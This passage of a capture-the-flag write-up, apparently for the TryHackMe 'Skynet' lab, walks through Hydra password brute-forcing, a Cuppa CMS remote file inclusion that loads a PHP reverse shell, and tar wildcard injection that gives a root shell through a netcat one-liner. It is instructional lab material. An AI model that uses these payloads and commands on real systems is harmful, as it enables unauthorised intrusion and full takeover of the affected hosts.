POST /squirrelmail/src/redirect.php HTTP/1.1
Host: 10.10.180.3
Content-Length: 75
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.180.3
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.180.3/squirrelmail/src/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: SQMSESSID=s9tj14ejoj4qcukfjbltigs9c4
Connection: close

login_username=test&secretkey=test&js_autodetect_results=1&just_logged_in=1
```

Using the information from the request we form our command for **hydra**:

```sh
hydra -l milesdyson -P log1.txt 10.10.136.30 http-post-form '/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect'
```

The attack result is the following:

```sh
┌──(kali㉿kali)-[~/Documents/THM/skynet]
└─$ hydra -l milesdyson -P log1.txt 10.10.136.30 http-post-form '/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect'
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-25 18:06:16
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://10.10.136.30:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect
[80][http-post-form] host: 10.10.136.30   login: milesdyson   password: {PASSWORD_REDACTED}
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-25 18:06:38

```

With this result we can answer the first question of the room. **(milesdyson:{PASSWORD_REDACTED})**

If we log into the email with Miles' credentials, we see some emails:

![Miles emails](https://i.imgur.com/ZCY4EJy.png)


It seems Miles' password has been reset due to a system malfunction:

```sh
We have changed your smb password after system malfunction.
Password: {PASSWORD_REDACTED}
```

We also see some other emails with binary information:

![Miles emails binary](https://i.imgur.com/Ew19QQx.png)

We'll download a copy of this in case it comes in handy later on, the third and last email is also quite odd:

![Miles third email](https://i.imgur.com/C0Va2rs.png)


I've looked into that binary email and translates to some nonsense for now. Let's try to connect to that SMB as Miles, shall we?

```sh
┌──(kali㉿kali)-[~/Documents/THM/skynet]
└─$ smbclient //10.10.136.30/milesdyson/ -U milesdyson                                                                                                                                                                      
Enter WORKGROUP\milesdyson's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Sep 17 05:05:47 2019
  ..                                  D        0  Tue Sep 17 23:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
  notes                               D        0  Tue Sep 17 05:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019

                9204224 blocks of size 1024. 5369016 blocks available
smb: \> cd notes
smb: \notes\> dir
  .                                   D        0  Tue Sep 17 05:18:40 2019
  ..                                  D        0  Tue Sep 17 05:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 05:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 05:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 05:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 05:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 05:01:29 2019
  important.txt                       N      117  Tue Sep 17 05:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 05:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 05:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 05:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 05:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 05:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 05:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 05:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 05:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 05:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 05:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 05:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 05:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 05:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 05:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 05:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 05:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 05:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 05:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 05:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 05:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 05:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 05:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 05:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 05:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 05:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 05:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 05:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 05:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 05:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 05:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 05:01:29 2019

                9204224 blocks of size 1024. 5368836 blocks available
smb: \notes\> get important.txt
getting file \notes\important.txt of size 117 as important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \notes\> 


```

once we connect to Miles' SMB private share, we can see a file called **important.txt** which gives us some useful information:

```sh
1. Add features to beta CMS /{URL_REDACTED}
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

This file let us answer some more questions.

If we access the CMS URL mentioned in that note we get Miles' personal page, some sort of about page:

![Miles Personal Page](https://i.imgur.com/UwK0SiJ.png)


- Note: I'll also keep a copy of Miles Picture, just in case there is something hidden on it.

Since we know have discovered a weirdly named new directory, let's run **goBuster** on that to see if we get anything else under that path:

```sh
┌──(kali㉿kali)-[~/Documents/THM/skynet]
└─$ gobuster dir -u 10.10.136.30/{REDACTED} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.136.30/{REDACTED}
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/25 18:58:28 Starting gobuster
===============================================================
/administrator (Status: 301)

```
After a little while, we get a partial result. There is an administration page that we can look at:

![CMS Login Page](https://i.imgur.com/re6i8Bb.png)

Thanks to this login page, we get some details about the CMS version running. With that we can search for a possible exploit:

```sh
┌──(kali㉿kali)-[~]
└─$ searchsploit cuppa
---------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                          |  Path
---------------------------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                         | php/webapps/25971.txt
---------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ locate php/webapps/25971.txt
/usr/share/exploitdb/exploits/php/webapps/25971.txt
                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ subl /usr/share/exploitdb/exploits/php/webapps/25971.txt


```

We see there is a RFI vulnerability that we could possibly exploit. Let's open the exploit to see what it does.
It seems thre is that **/alertConfigField.php** that can be exploited by adding some payload to the URL:

```sh
http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
```
- [FI] indicates we can add a File Inclusion here, since a bit of code in the **/alertConfigField.php** file would actually load files.

We'll download a PHP reverse shell that we can use to get access to the machine:

- **Basic PHP Reverse Shell**: Click [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) to download.

The exploit only needs two values changed, our tun0 IP and Port:

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.13.0.34';  // CHANGE THIS
$port = 2112;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

- More info on the port selected [here](https://youtu.be/AZm1_jtY1SQ) :)

Ok with the exploit ready let's fire up a python HTTP server to make it available:

```sh
┌──(kali㉿kali)-[~/Documents/THM/skynet/php-reverse-shell-1.0]
└─$ python -m SimpleHTTPServer 
Serving HTTP on 0.0.0.0 port 8000 ...

```
Now we need to create a netcat listener to hopefully get our reverse shell:

```sh
kali@kali:~$ nc -nlvp 2112
listening on [any] 2112 ...

```

I think we are ready to try to load our payload using the URL:

```sh
/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.0.34:8000/revShell.php?
```

Once we run that URL on the Browser, we see our reverse shell is served and executed successfully:

```sh
kali@kali:~$ nc -nlvp 2112
listening on [any] 2112 ...
connect to [10.13.0.34] from (UNKNOWN) [10.10.136.30] 44250
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 18:32:05 up  2:12,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd home
$ ls
milesdyson
$ cd milesdyson
$ dir
backups  mail  share  user.txt
$ cat user.txt
{USER_FLAG_REDACTED}
$ 

```

With this access we should be able to read the user flag.


To move forward with this privesc, we need to get some more information from the system.
We put **linPEAS.sh** into our local HTTP server folder and using **wget** on the connected session we donwload it into the target machine.


Looking at the report from linPEAS, we see a possible exploitation for the Linux Kernel:

```sh
/usr/bin/pkexec         --->    Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
```

We see we have a gcc exploit available [here](https://github.com/jas502n/CVE-2019-13272)

However, if we check the cronjobs we can see there is a job running that we could try to exploit:

```sh
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

```

let's see what this sh file is about:

```bash
$ cat /home/milesdyson/backups/backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

apparently this copies the whole HTML directory and somehow the wildcards passed to **tar** can be exploited...
At this point my brain almost stopped working. 

This is from THMs post:

Well, believe it or not, this creates a vulnerability as we can use it to  execute code. HelpNetSecurity best explains how this vulnerability works, but in essence, tar has wildcards and we can use checkpoint actions to execute commands.

```sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.0.34 2113 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```

So running these commands we leverage tar's checkpoints and we can execute arbitrary code as root. Sweet!
Let's try it out!

```sh
$ cd /var/www/html
$ ls
--checkpoint-action=exec=sh shell.sh
--checkpoint=1
45kra24zxs28v3yd
admin
ai
config
css
image.png
index.html
js
style.css
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.0.34 2113 >/tmp/f" > shell.sh
$ touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
$ touch "/var/www/html/--checkpoint=1"

```

and we get our root shell!!


```sh
┌──(kali㉿kali)-[/opt/privilege-escalation-awesome-scripts-suite/linPEAS]
└─$ nc -nlvp 2113
listening on [any] 2113 ...
connect to [10.13.0.34] from (UNKNOWN) [10.10.136.30] 54234
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
{ROOT_FLAG_REDACTED}
# 

```

As usual, happy hacking.

{{< thm_badge >}}
